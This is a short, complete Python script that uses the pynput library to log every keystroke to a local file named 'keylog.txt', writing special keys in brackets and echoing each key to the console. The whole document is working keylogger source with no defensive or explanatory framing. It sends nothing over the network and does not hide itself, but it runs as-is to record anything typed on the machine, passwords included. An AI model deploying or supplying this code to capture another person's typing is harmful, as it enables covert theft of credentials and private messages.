from pynput import keyboard

def keyPressed(key):
    try:
        # Log alphanumeric characters
        with open("keylog.txt", 'a') as logkey:
            logkey.write(str(key.char))  # `key.char` is the character
    except AttributeError:
        # Log special keys
        with open("keylog.txt", 'a') as logkey:
            logkey.write(f'[{key}]')  # Represent special keys within brackets

    print(f"Key pressed: {key}")  # Display the key in the console (optional)

if __name__ == "__main__":
    # Set up the listener
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()  # Keeps the listener running indefinitely
